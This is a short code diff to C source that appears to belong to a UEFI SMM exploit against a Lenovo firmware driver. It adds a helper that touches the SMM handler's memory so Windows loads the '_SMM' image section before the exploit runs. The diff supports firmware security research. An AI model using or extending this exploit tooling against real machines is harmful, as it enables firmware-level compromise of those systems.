@@ -167,6 +167,21 @@ void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void)
     }
 }
 //--------------------------------------------------------------------------------------
+#pragma optimize("", off)
+
+static void smm_image_section_workaround(void)
+{
+    /*
+        smm_handler() and other functions that being executed in SMM
+        are stored in separate executable image section "_SMM". Windows
+        will copy contents of this section into the physical memory only 
+        after the first access to it's virtual memory pages.
+    */
+    unsigned char foo = *(unsigned char *)&smm_handler;
+}
+
+#pragma optimize("", on)
+//--------------------------------------------------------------------------------------
 bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
     int target, PUEFI_EXPL_TARGET custom_target, 
     UEFI_EXPL_SMM_HANDLER handler, void *context, 
@@ -178,6 +193,9 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
 
     smm_context.smi_count = 0;
     smm_context.user_handler = smm_context.user_context = 0;
+
+    // see comments
+    smm_image_section_workaround();
 
     if (target != -1)
     {
